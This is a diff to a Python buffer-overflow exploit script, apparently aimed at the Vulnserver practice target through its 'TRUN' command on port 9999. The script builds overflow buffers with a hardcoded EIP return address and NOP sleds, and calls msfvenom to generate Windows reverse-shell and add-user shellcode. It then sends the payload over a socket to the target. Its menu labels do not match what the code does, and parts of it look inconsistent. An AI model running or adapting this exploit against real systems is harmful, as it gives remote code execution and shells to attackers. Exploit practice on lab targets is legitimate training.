@@ -11,7 +11,7 @@ CRASH = 3000 # Size of the total payload when EXE crashed
 PORT = 9999 # Remote Port where the EXE is listening
 EBP = 2003 # Total Size of the EBP
 EIP = "\xaf\x11\x50\x62" # EIP Size
-NOPS = 10 # Size of NOPS
+NOPS = 30 # Size of NOPS
 cmd = "TRUN /.:/" # Name oof the Vulnerable variable
 
 badcharlist = (
@@ -59,7 +59,7 @@ def sendPayload(buffer):
     try:
         print(Fore.RED + "Sending Payload ....")
         payload = cmd + buffer
-        print(bytes(payload,"latin-1"))
+        print(payload)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((IP, PORT))
         s.send(bytes(payload,"latin-1"))
@@ -123,21 +123,22 @@ def remove_badchars(badchar):
 
     sendPayload(buffer)
 
-def shellcode(choice,LHOST=None,LPORT=None):
+def shellcode(LHOST=None,LPORT=None):
     if EIP == "":
         print("Please set the EIP Location.")
         print(Fore.RED + "Exiting...")
         sys.exit()
-
-    print('''
-    1. Windows Reverse Shell TCP
-    2. Windows Reverse Shell TCP x64
-    3. Windows User Add 
-    4. Windows User Add x64
-    ''')
-    
-    #choice = int(input(">> "))
-    
+        
+    modules = {
+        1:'Windows Reverse Shell TCP',
+        2:'Windows User Add'
+    }
+    for key,value in modules.items():
+        print(str(key)+" : "+value)
+        
+    choice = int(input(">> "))
+    print(Fore.GREEN+"Executing {}".format(modules[choice]))
+        
     if choice == 1 or choice == 2:
         if LHOST == None or LPORT == None:
             LHOST = input("Enter LHOST IP Address : ")
@@ -149,23 +150,18 @@ def shellcode(choice,LHOST=None,LPORT=None):
             bd = bd[:-1]
         if choice == 1:
             shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
-            shellcode = shellcode.stdout.decode('latin-1')
-            shellcode = shellcode.split("\n",1)[1]
-            shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")])
-            print("Shellcode : "+str(shellcode))
-            buffer = "\x41" * EBP + EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
-            sendPayload(buffer)
         if choice == 2:
             #print("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd))
             shellcode = subprocess.run(["msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
-            shellcode = shellcode.stdout.decode('utf-8')
-            shellcode = shellcode.split("\n",1)[1]
-            shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
-            import codecs
-            shellcode=codecs.decode(shellcode, 'unicode_escape')
-            #print("Shellcode : "+shellcode)
-            buffer = "\x41" * EBP + EIP + "\x90" * NOPS + shellcode + "\x43" * ( CRASH - EBP - 4 - NOPS)
-            sendPayload(buffer)
+        
+        shellcode = shellcode.stdout.decode('latin-1')
+        shellcode = shellcode.split("\n",1)[1]
+        shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
+        shellcode=codecs.decode(shellcode, 'unicode_escape')
+        print("Shellcode : "+str(shellcode))
+        buffer = "\x41" * EBP + EIP + "\x90" * NOPS + str(shellcode) + "\x43" * ( CRASH - EBP - 4 - NOPS)
+        sendPayload(buffer)
+            
     if choice == 3:
         # msfvenom -p windows/adduser -b "\x00\x04\xa4\xba\xef" -e x86/fnstenv_mov -f c
         with open('badchar.txt', 'r') as f:
@@ -175,9 +171,10 @@ def shellcode(choice,LHOST=None,LPORT=None):
         shellcode = subprocess.run([command], shell=True, stdout=subprocess.PIPE)
         shellcode = shellcode.stdout.decode('latin-1')
         shellcode = shellcode.split("\n",1)[1]
-        shellcode = shellcode[:-2]
+        shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
+        shellcode=codecs.decode(shellcode, 'unicode_escape')
        
-        buffer = "\x41" * EBP + "\x42" * EIP + "\x90" * NOPS + shellcode + "\x43" * ( CRASH - EBP - 4 - NOPS)
+        buffer = "\x41" * EBP + EIP + "\x90" * NOPS + shellcode + "\x43" * ( CRASH - EBP - 4 - NOPS)
         sendPayload(buffer)
 
 if __name__ == '__main__':
@@ -188,13 +185,13 @@ if __name__ == '__main__':
         parser.add_argument('-q', help='Query to find the offset address')
         parser.add_argument('-b', help='Send Badchars to the target', action='store_true')
         parser.add_argument('-br', help='Specify the found badcharacter')
-        parser.add_argument('-s', help='Generate Shellcode')
+        parser.add_argument('-s', help='Generate Shellcode',action='store_true')
         parser.add_argument('--L', help='Local address for reverse shell')
         parser.add_argument('--P', help='Local Port for reverse shell')
         
         args = parser.parse_args()
 
-        if args.c :
+        if args.c:
             Crash()
         
         if args.l :
@@ -211,12 +208,4 @@ if __name__ == '__main__':
             remove_badchars(args.br)
 
         if args.s:
-            shellcode(int(args.s),args.L,args.P)
-            
-
-
-        
-
-        
-    
-
+            shellcode(args.L,args.P)    
